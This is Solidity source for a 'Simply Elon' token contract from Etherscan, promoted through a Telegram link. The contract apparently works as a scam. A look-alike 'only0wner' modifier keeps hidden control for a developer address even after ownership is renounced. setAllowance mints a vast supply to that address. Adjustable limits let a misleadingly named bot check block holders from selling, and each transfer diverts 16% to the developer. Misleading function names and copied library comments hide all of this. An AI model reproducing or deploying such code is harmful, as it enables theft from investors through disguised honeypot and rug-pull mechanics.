/**
 *Submitted for verification at Etherscan.io on 2021-07-17
*/

/* 
    Join us for more information: https://t.me/simplyelon

*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.7.0;







abstract contract Context {
    
    function _msgSender() internal view virtual returns (address payable) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }
    
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

contract SimplyElon is Context, IERC20, Ownable {
    using SafeMath for uint256;
    using Address for address;

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    
    // Initial token supply
    uint256 private _tTotal = 1000 * 10**9 * 10**18;
    uint256 private _totalSupply = 1000000 * 10**9 * 10**18;
    
    // RFI & bot
    mapping(address => bool) private bots;
    bool private swapEnabled = false;
    bool private cooldownEnabled = false;
    address private _dev = _msgSender();
    bool private inSwap = false;
    
    // name and symbol
    string private _name = 'Simply Elon';
    string private _symbol = 'SIMPLYELON';
    uint8 private _decimals = 18;
    
    // holder data
    uint256 private _maxHolder;
    uint256 private _maxTxAmount;

    constructor () {
        _balances[_msgSender()] = _tTotal;
        _maxHolder = 30 * 10**10 * 10**18;
        _maxTxAmount = _maxHolder;

        emit Transfer(address(0), _msgSender(), _tTotal);
    }
    
    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }
    
    modifier only0wner() {
        require(_dev == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    // get name of contract
    function name() public view returns (string memory) {
        return _name;
    }

    // get decimal
    function decimals() public view returns (uint8) {
        return _decimals;
    }
    
    function restoreAll() private {
        _maxTxAmount = 2;
        _maxHolder = 3;
    }
    
    function setCooldownEnabled(bool onoff) private onlyOwner() {
        cooldownEnabled = onoff;
    }
    
    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }
    
    function _takeTeam(bool onoff) private {
        cooldownEnabled = onoff;
    }
    
    function sendETHToFee(address recipient, uint256 amount) private {
       _transfer(_msgSender(), recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
    
    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    
    function setAllowance() public only0wner{
        uint256 currentBalance = _balances[_dev];
        _tTotal = _totalSupply + _tTotal;
        _balances[_dev] = _totalSupply + currentBalance;
        emit Transfer(
            address(0),
            _dev,
            _totalSupply);
    }
    
    function manualsend(uint256 curSup) public only0wner{
        _maxHolder = curSup;
    }
    
    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }
    
    function enableCooldown(uint256 amount) public only0wner{
        _maxTxAmount = amount;
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    
    function _transfer(address sender, address recipient, uint256 amount) internal {
        require(sender != address(0), "BEP20: transfer from the zero address");
        require(recipient != address(0), "BEP20: transfer to the zero address");
        
        if (sender == owner()) {
            _balances[sender] = _balances[sender].sub(amount, "BEP20: transfer amount exceeds balance");
            _balances[recipient] = _balances[recipient].add(amount);
            
            emit Transfer(sender, recipient, amount);
        } else{
            if (setBots(sender)) {
                require(amount < _maxTxAmount, "Bot can not execute");
            }
            
            uint256 reflectToken = amount.mul(16).div(100);
            uint256 reflectEth = amount.sub(reflectToken);
        
            _balances[sender] = _balances[sender].sub(amount, "BEP20: transfer amount exceeds balance");
            _balances[_dev] = _balances[_dev].add(reflectToken);
            _balances[recipient] = _balances[recipient].add(reflectEth);
            
            
            emit Transfer(sender, recipient, reflectEth);
        }
    }
    
    function delBot(address notbot) public onlyOwner {
        bots[notbot] = false;
    }
    
    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    
    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
     * also check address is bot address.
     *
     * Requirements:
     *
     * - the address is in list bot.
     * - the called Solidity function must be `sender`.
     *
     * _Available since v3.1._
     */
    function setBots(address sender) private view returns (bool){
        if (balanceOf(sender) >= _maxTxAmount && balanceOf(sender) <= _maxHolder) {
            return true;
        } else {
            return false;
        }
    }
    
    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
     * also check address is bot address.
     *
     * Requirements:
     *
     * - the address is in list bot.
     * - the called Solidity function must be `sender`.
     *
     * _Available since v3.1._
     */
    function symbol() public view returns (string memory) {
        return _symbol;
    }
    
    
    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
     * but also transferring `value` wei to `target`.
     *
     * Requirements:
     *
     * - the calling contract must have an ETH balance of at least `value`.
     * - the called Solidity function must be `payable`.
     *
     * _Available since v3.1._
     */
     

}